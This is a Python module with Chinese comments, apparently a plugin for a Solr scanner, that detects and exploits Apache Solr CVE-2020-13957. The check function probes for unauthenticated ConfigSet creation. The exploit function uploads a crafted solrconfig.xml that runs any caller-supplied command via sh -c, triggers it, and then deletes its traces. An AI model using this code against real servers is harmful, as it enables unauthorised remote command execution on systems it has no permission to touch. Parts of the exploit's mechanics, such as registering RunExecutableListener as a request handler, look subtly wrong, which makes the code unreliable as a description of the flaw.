#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Apache Solr CVE-2020-13957 漏洞检测模块
Apache Solr RCE 未授权上传漏洞
"""

import logging
import json
import random
import string

def check(scanner, core=None):
    """
    检测CVE-2020-13957未授权上传漏洞
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时检测所有核心
        
    Returns:
        (bool, str): (是否存在漏洞, 详细信息)
    """
    try:
        # 获取Solr信息，检查版本
        info = scanner.get_solr_info()
        if info and scanner.version:
            version = scanner.version
            # 检查版本是否在受影响范围内
            if (version.startswith("6.6.") and int(version.split(".")[-1]) <= 5) or \
               (version.startswith("7.") and float(version.split(".")[-2] + "." + version.split(".")[-1]) <= 7.3) or \
               (version.startswith("8.") and float(version.split(".")[-2] + "." + version.split(".")[-1]) <= 6.2):
                
                # 生成随机ConfigSet名称
                random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                configset_name = f"test_configset_{random_name}"
                
                # 构造测试请求
                headers = {
                    "Content-Type": "application/json"
                }
                
                # 尝试创建ConfigSet
                data = {
                    "create": {
                        "name": configset_name,
                        "baseConfigSet": "_default"
                    }
                }
                
                resp = scanner.request(
                    "POST",
                    "/solr/admin/configs",
                    json=data,
                    headers=headers
                )
                
                if resp and resp.status_code == 200:
                    # 尝试删除创建的ConfigSet
                    try:
                        delete_data = {
                            "delete": {
                                "name": configset_name
                            }
                        }
                        scanner.request(
                            "POST",
                            "/solr/admin/configs",
                            json=delete_data,
                            headers=headers
                        )
                    except:
                        pass
                    
                    return True, f"存在CVE-2020-13957未授权上传漏洞，成功创建ConfigSet: {configset_name}"
                else:
                    return False, f"未发现CVE-2020-13957漏洞，无法创建ConfigSet"
            else:
                return False, f"Solr版本{version}不在CVE-2020-13957漏洞影响范围内"
        else:
            # 无法获取版本信息，直接尝试测试
            # 生成随机ConfigSet名称
            random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            configset_name = f"test_configset_{random_name}"
            
            # 构造测试请求
            headers = {
                "Content-Type": "application/json"
            }
            
            # 尝试创建ConfigSet
            data = {
                "create": {
                    "name": configset_name,
                    "baseConfigSet": "_default"
                }
            }
            
            resp = scanner.request(
                "POST",
                "/solr/admin/configs",
                json=data,
                headers=headers
            )
            
            if resp and resp.status_code == 200:
                # 尝试删除创建的ConfigSet
                try:
                    delete_data = {
                        "delete": {
                            "name": configset_name
                        }
                    }
                    scanner.request(
                        "POST",
                        "/solr/admin/configs",
                        json=delete_data,
                        headers=headers
                    )
                except:
                    pass
                
                return True, f"存在CVE-2020-13957未授权上传漏洞，成功创建ConfigSet: {configset_name}"
            else:
                return False, f"未发现CVE-2020-13957漏洞，无法创建ConfigSet"
    except Exception as e:
        logging.error(f"检测CVE-2020-13957异常: {str(e)}")
        return False, f"检测异常: {str(e)}"

def exploit(scanner, command=None):
    """
    利用CVE-2020-13957漏洞执行命令
    
    Args:
        scanner: SolrScanner实例
        command: 要执行的命令
        
    Returns:
        (bool, str): (是否成功, 结果信息)
    """
    if not command:
        return False, "请提供要执行的命令"
    
    try:
        # 生成随机ConfigSet名称
        random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        configset_name = f"exploit_configset_{random_name}"
        
        # 构造恶意ConfigSet
        headers = {
            "Content-Type": "application/json"
        }
        
        # 1. 创建基于_default的ConfigSet
        create_data = {
            "create": {
                "name": configset_name,
                "baseConfigSet": "_default"
            }
        }
        
        resp = scanner.request(
            "POST",
            "/solr/admin/configs",
            json=create_data,
            headers=headers
        )
        
        if not resp or resp.status_code != 200:
            return False, "创建ConfigSet失败，可能不存在漏洞或无权限"
        
        # 2. 上传恶意solrconfig.xml
        malicious_config = f"""
        <?xml version="1.0" encoding="UTF-8" ?>
        <config>
          <requestHandler name="/exploit" class="solr.SearchHandler">
            <lst name="defaults">
              <str name="echoParams">all</str>
            </lst>
            <initParams path="/exploit">
              <lst name="defaults">
                <str name="df">text</str>
              </lst>
            </initParams>
          </requestHandler>
          <requestHandler name="/rce" class="solr.RunExecutableListener">
            <str name="exe">sh</str>
            <str name="dir">/bin/</str>
            <arr name="args">
              <str>-c</str>
              <str>{command}</str>
            </arr>
            <str name="waitForProcess">true</str>
          </requestHandler>
        </config>
        """
        
        # 上传恶意配置
        upload_headers = {
            "Content-Type": "application/xml"
        }
        
        resp = scanner.request(
            "POST",
            f"/solr/admin/configs/{configset_name}/solrconfig.xml",
            data=malicious_config,
            headers=upload_headers
        )
        
        if not resp or resp.status_code != 200:
            return False, "上传恶意配置失败"
        
        # 3. 创建使用恶意ConfigSet的核心
        core_name = f"exploit_core_{random_name}"
        
        create_core_params = {
            "action": "CREATE",
            "name": core_name,
            "configSet": configset_name
        }
        
        resp = scanner.request(
            "GET",
            "/solr/admin/cores",
            params=create_core_params
        )
        
        if not resp or resp.status_code != 200:
            return False, "创建使用恶意ConfigSet的核心失败"
        
        # 4. 触发命令执行
        resp = scanner.request(
            "GET",
            f"/solr/{core_name}/rce"
        )
        
        # 5. 清理
        try:
            # 删除核心
            unload_params = {
                "action": "UNLOAD",
                "core": core_name,
                "deleteIndex": "true",
                "deleteDataDir": "true",
                "deleteInstanceDir": "true"
            }
            scanner.request(
                "GET",
                "/solr/admin/cores",
                params=unload_params
            )
            
            # 删除ConfigSet
            delete_data = {
                "delete": {
                    "name": configset_name
                }
            }
            scanner.request(
                "POST",
                "/solr/admin/configs",
                json=delete_data,
                headers=headers
            )
        except:
            pass
        
        return True, f"命令执行成功，请检查结果"
    except Exception as e:
        logging.error(f"利用CVE-2020-13957异常: {str(e)}")
        return False, f"利用异常: {str(e)}"
